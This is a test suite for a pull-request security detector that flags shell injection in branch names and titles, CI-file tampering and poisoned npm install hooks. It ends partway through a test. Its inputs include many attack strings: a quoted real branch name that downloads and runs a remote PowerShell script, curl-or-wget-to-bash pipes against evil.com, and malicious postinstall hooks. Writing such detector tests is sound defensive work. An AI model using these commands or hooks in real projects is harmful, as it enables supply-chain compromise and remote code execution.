import { describe, it, expect } from "vitest";
import {
  checkInjection,
  checkCiFiles,
  checkLifecyclePatch,
  detectSuspiciousPR,
  detectSuspiciousIssue,
  validateInput,
  validateIssueInput,
} from "../src/detect.ts";
import type { DetectionReason } from "../src/detect.ts";

/** Shorthand: returns true when any reasons are produced. */
function isSuspicious(reasons: DetectionReason[]): boolean {
  return reasons.length > 0;
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. checkInjection – branch names (strict = true)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection (strict / branch names)", () => {
  const strict = true;

  describe("detects malicious branch names", () => {
    it("real attack PR #37419 – $(iex(irm(...)))", () => {
      const reasons = checkInjection(
        "Branch",
        "docs/r-$(iex(irm('storage.googleapis.com/ci-static-jp/ci.ps1')))",
        strict,
      );
      expect(isSuspicious(reasons)).toBe(true);
      expect(reasons).toHaveLength(3);
      expect(reasons.some((r) => r.message.includes("substitution"))).toBe(true);
      expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
      expect(reasons.some((r) => r.message.includes("script file"))).toBe(true);
    });

    it("$() with curl pipe to bash", () => {
      const reasons = checkInjection(
        "Branch",
        "fix/$(curl http://evil.com/payload.sh | bash)",
        strict,
      );
      expect(isSuspicious(reasons)).toBe(true);
      expect(reasons.some((r) => r.message.includes("substitution"))).toBe(true);
    });

    it("backtick execution", () => {
      const reasons = checkInjection("Branch", "update-`wget evil.com/x`", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it.each(["iex", "irm", "iwr"])("PowerShell alias: %s", (alias) => {
      const reasons = checkInjection("Branch", `feature/${alias}-something`, strict);
      expect(isSuspicious(reasons)).toBe(true);
      expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
    });

    it.each(["Invoke-Expression", "Invoke-RestMethod", "Invoke-WebRequest", "Start-Process"])(
      "PowerShell cmdlet: %s",
      (cmdlet) => {
        const reasons = checkInjection("Branch", `x/${cmdlet}-test`, strict);
        expect(isSuspicious(reasons)).toBe(true);
        expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
      },
    );

    it.each(["DownloadString", "DownloadFile"])("PowerShell method: %s", (method) => {
      const reasons = checkInjection("Branch", `x/${method}-test`, strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it.each(["https://evil.com/pwn", "http://evil.com", "ftp://evil.com/file"])(
      "embedded URL: %s",
      (url) => {
        const reasons = checkInjection("Branch", `docs/update-${url}`, strict);
        expect(isSuspicious(reasons)).toBe(true);
        expect(reasons.some((r) => r.message.includes("URL"))).toBe(true);
      },
    );

    it.each([".ps1", ".sh", ".bat", ".cmd", ".vbs", ".py", ".rb", ".pl"])(
      "script extension: %s",
      (ext) => {
        const reasons = checkInjection("Branch", `fix/run-script${ext}`, strict);
        expect(isSuspicious(reasons)).toBe(true);
        expect(reasons.some((r) => r.message.includes("script file"))).toBe(true);
      },
    );

    it.each(["%24", "%60", "%7c", "%7C", "%3b", "%3B"])("URL-encoded metachar: %s", (encoded) => {
      const reasons = checkInjection("Branch", `feat/${encoded}(attack)`, strict);
      expect(isSuspicious(reasons)).toBe(true);
      expect(reasons.some((r) => r.message.includes("URL-encoded"))).toBe(true);
    });

    it("curl piped to sh", () => {
      const reasons = checkInjection("Branch", "curl http://evil.com | sh", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it("wget piped to bash", () => {
      const reasons = checkInjection("Branch", "wget http://evil.com/x | bash", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it("bash -c", () => {
      const reasons = checkInjection("Branch", 'x/bash -c "whoami"', strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it("sh -c", () => {
      const reasons = checkInjection("Branch", "x/sh -c id", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it("/bin/bash", () => {
      const reasons = checkInjection("Branch", "x//bin/bash", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });

    it("/bin/sh", () => {
      const reasons = checkInjection("Branch", "x//bin/sh", strict);
      expect(isSuspicious(reasons)).toBe(true);
    });
  });

  describe("passes benign branch names", () => {
    it.each([
      ["fix/update-readme", "Simple fix branch"],
      ["feature/add-new-api-endpoint", "Feature branch"],
      ["docs/improve-error-handling", "Docs branch"],
      ["user/jdoe/fix-123", "User branch with numbers"],
      ["release/v2.0.0-beta.1", "Release branch"],
      ["fix/confirm-dialog", "Contains 'irm' substring but not word-bounded"],
      ["feature/firmware-update", "Contains 'irm' substring in 'firmware'"],
      ["chore/upgrade-opentelemetry-instrumentation", "Real community branch #37250"],
      ["fix/cosmos-request-abort-leak", "Real community branch #35428"],
      ["patch-1", "Real community branch #36858"],
      ["fix/span_status", "Real community branch #35308"],
      ["andersonc/fix-http-31119", "Real community branch #31120"],
      ["sync-eng/common-AddGHAppWorkflowLogin-14219", "Real internal branch #37403"],
      ["users/raych1/update-instructions", "Real internal branch #36985"],
      ["feat/pnpm-part1-switch-to-pnpm-as-tool", "Real internal branch #34941"],
    ])("%s – %s", (branch) => {
      const reasons = checkInjection("Branch", branch, strict);
      expect(isSuspicious(reasons)).toBe(false);
    });
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 2. checkInjection – PR titles (strict = false)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection (basic / PR titles)", () => {
  const strict = false;

  describe("detects malicious titles", () => {
    it("command substitution in title", () => {
      expect(isSuspicious(checkInjection("Title", "Fix $(curl evil.com)", strict))).toBe(true);
    });

    it("backtick execution in title", () => {
      expect(isSuspicious(checkInjection("Title", 'a]"; `wget evil.com`; "', strict))).toBe(true);
    });

    it.each([
      "Invoke-Expression",
      "Invoke-RestMethod",
      "Invoke-WebRequest",
      "Start-Process",
      "DownloadString",
      "DownloadFile",
    ])("PowerShell cmdlet: %s", (cmdlet) => {
      expect(isSuspicious(checkInjection("Title", `Update ${cmdlet} handler`, strict))).toBe(true);
    });

    it("curl piped to bash in title", () => {
      expect(
        isSuspicious(checkInjection("Title", 'a"; curl evil.com | bash; echo "', strict)),
      ).toBe(true);
    });

    it("wget piped to sh in title", () => {
      expect(isSuspicious(checkInjection("Title", 'x"; wget evil.com | sh; echo "', strict))).toBe(
        true,
      );
    });

    it("bash -c in title", () => {
      expect(isSuspicious(checkInjection("Title", 'run bash -c "id"', strict))).toBe(true);
    });

    it("sh -c in title", () => {
      expect(isSuspicious(checkInjection("Title", "run sh -c id", strict))).toBe(true);
    });
  });

  describe("passes benign titles", () => {
    it.each([
      ["[docs] Update CLA", "Simple docs title"],
      ["Fix IRM module configuration", "IRM acronym – basic mode ignores short aliases"],
      ["Add retry logic for HTTP requests", "Normal title with HTTP"],
      ["Update https link in README", "URLs not checked in basic mode"],
      ["Fix start process for workers", "Lowercase 'start process' ≠ Start-Process"],
      [
        "chore(instrumentation): bump @opentelemetry/instrumentation",
        "Real community title #37250",
      ],
      ["@azure/cosmos: request handler - fix abortSignal leak", "Real community title #35428"],
      ["Sync eng/common directory with azure-sdk-tools for PR 14219", "Real internal title #37403"],
      ["[Pnpm migration] part1: switch to pnpm as tool", "Real internal title #34941"],
      [
        "fix(CosmosDB): http protocol endpoints no longer break CosmosClient",
        "Real community title #31120",
      ],
    ])("%s – %s", (title) => {
      expect(isSuspicious(checkInjection("Title", title, strict))).toBe(false);
    });
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 3. checkInjection – commit messages (strict = false)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection (basic / commit messages)", () => {
  it("flags cmd substitution + PS cmdlet", () => {
    expect(
      isSuspicious(checkInjection("Commit", "fix: update $(Invoke-RestMethod) handling", false)),
    ).toBe(true);
  });

  it("passes benign commit message", () => {
    expect(isSuspicious(checkInjection("Commit", "fix: update CLA link", false))).toBe(false);
  });

  it("passes normal merge commit", () => {
    expect(
      isSuspicious(checkInjection("Commit", "Merge branch main into feature/add-tests", false)),
    ).toBe(false);
  });

  it("passes commit with GitHub URL (basic mode)", () => {
    expect(
      isSuspicious(
        checkInjection(
          "Commit",
          "chore: update dependencies per https://github.com/issue/123",
          false,
        ),
      ),
    ).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 4. checkCiFiles
// ═════════════════════════════════════════════════════════════════════════════
describe("checkCiFiles", () => {
  describe("flags protected paths", () => {
    it.each([
      [".github/workflows/event-processor.yml", "workflow file"],
      [".github/actions/custom-action/action.yml", "custom action"],
      [".github/agents/something.yml", ".github/agents/"],
      ["eng/pipelines/templates/stages/archetype-sdk-client.yml", "pipeline template"],
      ["eng/common/scripts/Verify-Links.ps1", "common script"],
      ["eng/common/tsp-client/package.json", "tsp-client config"],
      ["eng/scripts/Language-Settings.ps1", "eng/scripts/"],
      ["eng/tools/versioning/VersionUtils.js", "eng/tools/"],
      ["eng/containers/Dockerfile", "eng/containers/"],
    ])("%s (%s)", (file) => {
      expect(isSuspicious(checkCiFiles([file]))).toBe(true);
    });

    it("flags .github/CODEOWNERS", () => {
      expect(isSuspicious(checkCiFiles([".github/CODEOWNERS"]))).toBe(true);
    });
  });

  describe("flags registry and build config", () => {
    it("root .npmrc", () => {
      expect(isSuspicious(checkCiFiles([".npmrc"]))).toBe(true);
    });

    it("nested .npmrc", () => {
      expect(isSuspicious(checkCiFiles(["sdk/core/core-client/.npmrc"]))).toBe(true);
    });

    it("turbo.json", () => {
      expect(isSuspicious(checkCiFiles(["turbo.json"]))).toBe(true);
    });

    it("pnpm-workspace.yaml", () => {
      expect(isSuspicious(checkCiFiles(["pnpm-workspace.yaml"]))).toBe(true);
    });
  });

  it("flags only the CI file among multiple changed files", () => {
    const reasons = checkCiFiles([
      "sdk/core/core-client/src/index.ts",
      ".github/workflows/ci.yml",
      "README.md",
    ]);
    expect(reasons).toHaveLength(1);
    expect(reasons[0].message).toContain("workflows/ci.yml");
  });

  describe("passes safe file paths", () => {
    it.each([
      ["sdk/core/core-client/src/index.ts", "SDK source file"],
      ["README.md", "Root README"],
      ["sdk/storage/storage-blob/package.json", "SDK package.json"],
      [".github/ISSUE_TEMPLATE/bug_report.md", "Issue template"],
      [".github/PULL_REQUEST_TEMPLATE/pull_request_template.md", "PR template"],
      ["eng/.docsettings.yml", "eng root config"],
      ["documentation/architecture.md", "Documentation"],
    ])("%s (%s)", (file) => {
      expect(isSuspicious(checkCiFiles([file]))).toBe(false);
    });

    it("mix of benign files", () => {
      expect(
        isSuspicious(
          checkCiFiles(["CONTRIBUTING.md", "LICENSE", "sdk/identity/identity/src/index.ts"]),
        ),
      ).toBe(false);
    });
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 5. checkLifecyclePatch
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch", () => {
  describe("flags malicious lifecycle patches", () => {
    it.each([
      ['+    "postinstall": "curl https://evil.com/x | bash"', "postinstall with curl pipe"],
      ['+    "preinstall": "wget https://evil.com/payload.sh"', "preinstall with wget"],
      [
        '+    "preinstall": "node -e \\"require(\'child_process\').exec(\'whoami\')\\"',
        "preinstall with node -e",
      ],
      ['+    "postinstall": "bash -c \\"echo pwned\\""', "postinstall with bash"],
      ['+    "postinstall": "sh -c \\"echo pwned\\""', "postinstall with sh -c"],
      ['+    "prepare": "powershell -c Get-Process"', "prepare with powershell"],
      [
        '+    "postinstall": "echo aHR0cHM6Ly9ldmlsLmNvbQ== | base64 -d | bash"',
        "postinstall with base64",
      ],
      ['+    "preinstall": "eval $(curl https://evil.com/payload)"', "preinstall with eval + curl"],
      ['+    "postinstall": "DownloadString https://evil.com"', "postinstall with DownloadString"],
    ])("%s (%s)", (patch, _description) => {
      expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
    });

    it("detects malicious lifecycle in nested package", () => {
      const reasons = checkLifecyclePatch(
        "sdk/core/package.json",
        '+    "postinstall": "DownloadString https://evil.com"',
      );
      expect(isSuspicious(reasons)).toBe(true);
      expect(reasons[0].message).toContain("sdk/core/package.json");
    });
  });

  describe("passes benign patches", () => {
    it("build script with curl (not a lifecycle hook)", () => {
      expect(
        isSuspicious(
          checkLifecyclePatch("package.json", '+    "build": "curl https://registry.npmjs.org"'),
        ),
      ).toBe(false);
    });

    it("test script with node -e", () => {
      expect(
        isSuspicious(
          checkLifecyclePatch("package.json", '+    "test": "node -e \\"console.log(1)\\""'),
        ),
      ).toBe(false);
    });

    it("version bump (not a script)", () => {
      expect(isSuspicious(checkLifecyclePatch("package.json", '+    "version": "1.0.0"'))).toBe(
        false,
      );
    });

    it("removed line (starts with -)", () => {
      expect(
        isSuspicious(
          checkLifecyclePatch("package.json", '-    "postinstall": "curl evil.com | bash"'),
        ),
      ).toBe(false);
    });

    it("empty patch", () => {
      expect(isSuspicious(checkLifecyclePatch("package.json", ""))).toBe(false);
    });

    it("prepare with safe dev-tool command", () => {
      expect(
        isSuspicious(
          checkLifecyclePatch("package.json", '+    "prepare": "dev-tool run build-package"'),
        ),
      ).toBe(false);
    });
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 6. detectSuspiciousPR – integration / end-to-end scenarios
// ═════════════════════════════════════════════════════════════════════════════
describe("detectSuspiciousPR (integration)", () => {
  it("catches real attack PR #37419 via branch name alone", () => {
    const result = detectSuspiciousPR({
      branchName: "docs/r-$(iex(irm('storage.googleapis.com/ci-static-jp/ci.ps1')))",
      title: "[docs ]Update CLA",
      commitMessages: ["Update CLA"],
      isFork: true,
      changedFiles: ["README.md"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.length).toBeGreaterThanOrEqual(3);
  });

  it("passes legitimate internal CI update (PR #37403)", () => {
    const result = detectSuspiciousPR({
      branchName: "sync-eng/common-AddGHAppWorkflowLogin-14219",
      title: "Sync eng/common directory with azure-sdk-tools for PR 14219",
      commitMessages: ["Sync eng/common from azure-sdk-tools"],
      isFork: false, // Same-repo PR → CI file checks skipped
      changedFiles: [".github/workflows/event-processor.yml", "eng/common/scripts/something.ps1"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(false);
  });

  it("passes legitimate fork PR with SDK-only changes (PR #35428)", () => {
    const result = detectSuspiciousPR({
      branchName: "fix/cosmos-request-abort-leak",
      title: "@azure/cosmos: request handler - fix abortSignal leak",
      commitMessages: ["fix: remove abort listener to prevent leak"],
      isFork: true,
      changedFiles: ["sdk/cosmosdb/cosmos/src/request/RequestHandler.ts"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(false);
  });

  it("blocks fork PR with innocent metadata but CI file tampering", () => {
    const result = detectSuspiciousPR({
      branchName: "docs/fix-typo",
      title: "Fix typo in README",
      commitMessages: ["fix typo"],
      isFork: true,
      changedFiles: ["README.md", ".github/workflows/event-processor.yml"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.category === "ci-tampering")).toBe(true);
  });

  it("blocks fork PR with dependency poisoning via postinstall", () => {
    const result = detectSuspiciousPR({
      branchName: "chore/update-deps",
      title: "Bump dependencies to latest",
      commitMessages: ["chore: bump deps"],
      isFork: true,
      changedFiles: ["sdk/core/core-client/package.json"],
      packagePatches: {
        "sdk/core/core-client/package.json":
          '+    "postinstall": "node -e \\"require(\'https\').get(\'https://evil.com/x\')\\""',
      },
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.category === "dependency-poisoning")).toBe(true);
  });

  it("blocks fork PR that modifies .npmrc", () => {
    const result = detectSuspiciousPR({
      branchName: "chore/update-npmrc",
      title: "Update npm config",
      commitMessages: ["update registry"],
      isFork: true,
      changedFiles: [".npmrc"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons[0].message).toContain(".npmrc");
  });

  it("blocks fork PR that modifies turbo.json", () => {
    const result = detectSuspiciousPR({
      branchName: "perf/turbo-update",
      title: "Improve build performance",
      commitMessages: ["update turbo config"],
      isFork: true,
      changedFiles: ["turbo.json", "sdk/core/core-client/src/index.ts"],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons[0].message).toContain("turbo.json");
  });

  it("separates reasons by category", () => {
    const result = detectSuspiciousPR({
      branchName: "$(curl evil.com)",
      title: "Innocent title",
      commitMessages: [],
      isFork: true,
      changedFiles: [".github/workflows/ci.yml"],
      packagePatches: {
        "package.json": '+    "postinstall": "curl https://evil.com | bash"',
      },
    });
    expect(result.suspicious).toBe(true);
    const categories = new Set(result.reasons.map((r) => r.category));
    expect(categories.has("injection")).toBe(true);
    expect(categories.has("ci-tampering")).toBe(true);
    expect(categories.has("dependency-poisoning")).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 7. validateInput
// ═════════════════════════════════════════════════════════════════════════════
describe("validateInput", () => {
  it("valid complete input passes through unchanged", () => {
    const input = {
      branchName: "fix/typo",
      title: "Fix typo",
      commitMessages: ["fix typo"],
      isFork: true,
      changedFiles: ["README.md"],
      packagePatches: { "package.json": "+something" },
      truncatedPatchKeys: [],
      body: "Some description",
    };
    const result = validateInput(input);
    expect(result).toEqual(input);
  });

  it("missing branchName defaults to empty string", () => {
    const result = validateInput({ title: "X" });
    expect(result.branchName).toBe("");
  });

  it("missing title defaults to empty string", () => {
    const result = validateInput({ branchName: "x" });
    expect(result.title).toBe("");
  });

  it("missing commitMessages defaults to empty array", () => {
    const result = validateInput({});
    expect(result.commitMessages).toEqual([]);
  });

  it("non-array commitMessages defaults to empty array", () => {
    const result = validateInput({ commitMessages: "not-an-array" });
    expect(result.commitMessages).toEqual([]);
  });

  it("commitMessages filters out non-string elements", () => {
    const result = validateInput({ commitMessages: ["valid", 123, null, "also valid", undefined] });
    expect(result.commitMessages).toEqual(["valid", "also valid"]);
  });

  it("missing isFork defaults to false", () => {
    const result = validateInput({});
    expect(result.isFork).toBe(false);
  });

  it("missing changedFiles defaults to empty array", () => {
    const result = validateInput({});
    expect(result.changedFiles).toEqual([]);
  });

  it("missing packagePatches defaults to empty object", () => {
    const result = validateInput({});
    expect(result.packagePatches).toEqual({});
  });

  it("packagePatches filters out non-string values", () => {
    const result = validateInput({
      packagePatches: { a: 123, b: { nested: true }, c: ["arr"], d: null },
    });
    expect(result.packagePatches).toEqual({});
  });

  it("packagePatches keeps only string values in a mixed object", () => {
    const result = validateInput({
      packagePatches: { good: "value", bad: 42, also_good: "ok", worse: undefined },
    });
    expect(result.packagePatches).toEqual({ good: "value", also_good: "ok" });
  });

  it("packagePatches that is an array returns empty object", () => {
    const result = validateInput({ packagePatches: ["not", "an", "object"] });
    expect(result.packagePatches).toEqual({});
  });

  it("null input returns safe defaults", () => {
    const result = validateInput(null);
    expect(result.branchName).toBe("");
    expect(result.title).toBe("");
    expect(result.commitMessages).toEqual([]);
    expect(result.isFork).toBe(false);
    expect(result.changedFiles).toEqual([]);
    expect(result.packagePatches).toEqual({});
    expect(result.body).toBeUndefined();
  });

  it.each([
    ["a string", "hello"],
    ["a number", 42],
    ["an array", [1, 2, 3]],
  ])("non-object input (%s) returns safe defaults", (_description, value) => {
    const result = validateInput(value);
    expect(result.branchName).toBe("");
    expect(result.title).toBe("");
    expect(result.commitMessages).toEqual([]);
    expect(result.isFork).toBe(false);
    expect(result.changedFiles).toEqual([]);
    expect(result.packagePatches).toEqual({});
  });

  it("missing body is undefined", () => {
    const result = validateInput({});
    expect(result.body).toBeUndefined();
  });

  it("valid body string passes through", () => {
    const result = validateInput({ body: "This is a PR description" });
    expect(result.body).toBe("This is a PR description");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 8. Shell command chaining detection (strict mode)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – shell command chaining (strict)", () => {
  const strict = true;

  it("detects ; command separator", () => {
    const reasons = checkInjection("Branch", "fix;curl evil.com", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("chaining"))).toBe(true);
  });

  it("detects && chaining", () => {
    const reasons = checkInjection("Branch", "fix&&wget evil.com", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("chaining"))).toBe(true);
  });

  it("detects || chaining", () => {
    const reasons = checkInjection("Branch", "fix||echo pwned", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("chaining"))).toBe(true);
  });

  it("detects > output redirection", () => {
    const reasons = checkInjection("Branch", "fix>output.txt", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(
      reasons.some((r) => r.message.includes("chaining") || r.message.includes("redirection")),
    ).toBe(true);
  });

  it("detects >> append redirection", () => {
    const reasons = checkInjection("Branch", "fix>>output.txt", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(
      reasons.some((r) => r.message.includes("chaining") || r.message.includes("redirection")),
    ).toBe(true);
  });

  it("does NOT flag benign text", () => {
    const reasons = checkInjection("Branch", "fix/update-readme", strict);
    expect(isSuspicious(reasons)).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 9. Process substitution detection (strict mode)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – process substitution (strict)", () => {
  const strict = true;

  it("detects <(command)", () => {
    const reasons = checkInjection("Branch", "fix/<(curl evil.com)", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("process substitution"))).toBe(true);
  });

  it("detects >(command)", () => {
    const reasons = checkInjection("Branch", "fix/>(curl evil.com)", strict);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("process substitution"))).toBe(true);
  });

  it("does NOT flag < alone or > alone (caught by SHELL_CHAIN separately)", () => {
    // < alone is not caught by PROC_SUBSTITUTION
    const reasonsLt = checkInjection("Branch", "fix/a<b", strict);
    expect(reasonsLt.some((r) => r.message.includes("process substitution"))).toBe(false);
    // > alone is caught by SHELL_CHAIN, not PROC_SUBSTITUTION
    const reasonsGt = checkInjection("Branch", "fix/a>b", strict);
    expect(reasonsGt.some((r) => r.message.includes("process substitution"))).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// Unicode evasion detection
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – Unicode evasion", () => {
  it("detects fullwidth $( as command substitution", () => {
    // ＄（ = U+FF04 U+FF08, normalized to $(
    const reasons = checkInjection("Branch", "\uFF04\uFF08curl evil.com)", true);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("command substitution"))).toBe(true);
  });

  it("detects Invoke-Expression through zero-width joiners", () => {
    // Insert zero-width joiners inside the keyword
    const reasons = checkInjection("Title", "Invoke\u200D-\u200DExpression payload", false);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
  });

  it("detects backtick injection with zero-width spaces", () => {
    const reasons = checkInjection("Branch", "`\u200Bwhoami\u200B`", true);
    expect(isSuspicious(reasons)).toBe(true);
  });

  it("detects fullwidth curl piped to bash", () => {
    // ｃｕｒｌ = fullwidth ASCII
    const reasons = checkInjection(
      "Branch",
      "\uFF43\uFF55\uFF52\uFF4C http://evil.com | bash",
      true,
    );
    expect(isSuspicious(reasons)).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 9b. curl/wget piped to other interpreters
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – curl/wget piped to other interpreters", () => {
  it.each(["python", "python3", "perl", "ruby", "node"])(
    "detects curl piped to %s (strict)",
    (interpreter) => {
      const reasons = checkInjection(
        "Branch",
        `fix/$(curl http://evil.com | ${interpreter})`,
        true,
      );
      expect(isSuspicious(reasons)).toBe(true);
    },
  );

  it.each(["python", "python3", "perl", "ruby", "node"])(
    "detects wget piped to %s in title (basic)",
    (interpreter) => {
      const reasons = checkInjection("Title", `run wget evil.com | ${interpreter}`, false);
      expect(isSuspicious(reasons)).toBe(true);
    },
  );
});

// ═════════════════════════════════════════════════════════════════════════════
// 10. pwsh detection
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – pwsh detection", () => {
  it("branch name containing pwsh is flagged (strict mode)", () => {
    const reasons = checkInjection("Branch", "x/pwsh-attack", true);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("PowerShell"))).toBe(true);
  });

  it("lifecycle patch with pwsh is flagged", () => {
    const patch = '+    "postinstall": "pwsh -c Get-Process"';
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 11. New script extensions (strict mode)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – new script extensions (strict)", () => {
  it.each([".mjs", ".cjs", ".mts", ".cts", ".tsx", ".jsx"])("script extension: %s", (ext) => {
    const reasons = checkInjection("Branch", `fix/run-script${ext}`, true);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("script file"))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 12. New URL-encoded metacharacters (strict mode)
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – new URL-encoded metacharacters (strict)", () => {
  it.each(["%26", "%0a", "%0A", "%0d", "%0D", "%23"])("URL-encoded metachar: %s", (encoded) => {
    const reasons = checkInjection("Branch", `feat/${encoded}(attack)`, true);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("URL-encoded"))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 13. pnpm-lock.yaml and package-lock.json in checkCiFiles
// ═════════════════════════════════════════════════════════════════════════════
describe("checkCiFiles – lockfile detection", () => {
  it("pnpm-lock.yaml is flagged with lockfile message", () => {
    const reasons = checkCiFiles(["pnpm-lock.yaml"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("lockfile"))).toBe(true);
  });

  it("package-lock.json is flagged with lockfile message", () => {
    const reasons = checkCiFiles(["package-lock.json"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("lockfile"))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 14. New protected paths in checkCiFiles
// ═════════════════════════════════════════════════════════════════════════════
describe("checkCiFiles – new protected paths", () => {
  it.each([
    [".devcontainer/devcontainer.json", ".devcontainer/"],
    [".vscode/tasks.json", ".vscode/"],
    [".husky/pre-commit", ".husky/"],
  ])("%s is flagged (%s)", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });
});

describe("checkCiFiles – dependency bot, submodule, and env file detection", () => {
  it.each([
    [".gitmodules", "submodule config"],
    [".env", "root env file"],
    ["sdk/core/.env", "nested env file"],
    [".env.production", "env variant"],
    [".github/dependabot.yml", "dependabot config"],
    [".github/dependabot.yaml", "dependabot yaml"],
    [".github/renovate.json", "renovate config"],
    [".github/renovate.json5", "renovate json5"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  it("does NOT flag files that contain .env. as substring", () => {
    expect(isSuspicious(checkCiFiles(["sdk/foo/utils.env.d.ts"]))).toBe(false);
    expect(isSuspicious(checkCiFiles(["something.env.util.js"]))).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 15. New lifecycle hooks in checkLifecyclePatch
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch – new lifecycle hooks", () => {
  it.each(["install", "prepack", "postpack"])("detects dangerous %s hook", (hook) => {
    const patch = `+    "${hook}": "curl evil.com | bash"`;
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 15b. Expanded dangerous commands in checkLifecyclePatch
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch – expanded dangerous commands", () => {
  it.each(["python", "python3", "ruby", "perl", "php", "npx"])(
    "detects %s in postinstall hook",
    (cmd) => {
      const patch = `+    "postinstall": "${cmd} -c 'malicious code'"`;
      expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
    },
  );

  it("detects node -p in lifecycle hook", () => {
    const patch = '+    "postinstall": "node -p \\"process.env\\""';
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 16. Multi-line lifecycle hook bypass fix
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch – multi-line detection", () => {
  it("detects lifecycle hook split across lines", () => {
    const patch = ['+    "postinstall":', '+      "curl https://evil.com | bash"'].join("\n");
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });

  it("detects multi-line postinstall with indentation", () => {
    const patch = [
      '+  "scripts": {',
      '+    "postinstall":',
      "+       \"node -e \\\"require('child_process').exec('whoami')\\\"\"",
      "+  }",
    ].join("\n");
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });

  it("does NOT flag hook and command far apart (window exceeded)", () => {
    const lines = [
      '+  "scripts": {',
      '+    "postinstall":',
      // Many unrelated lines between hook and command
      ...Array.from({ length: 20 }, (_, i) => `+    "field${i}": "value${i}"`),
      '+    "curl https://evil.com | bash"',
      "+  }",
    ];
    expect(isSuspicious(checkLifecyclePatch("package.json", lines.join("\n")))).toBe(false);
  });

  it("detects hook and command within proximity window", () => {
    const patch = [
      '+  "scripts": {',
      '+    "postinstall":',
      '+      "curl https://evil.com |',
      '+       bash"',
      "+  }",
    ].join("\n");
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 17. PR body scanning in detectSuspiciousPR
// ═════════════════════════════════════════════════════════════════════════════
describe("detectSuspiciousPR – PR body scanning", () => {
  it("flags injection in PR body", () => {
    const result = detectSuspiciousPR({
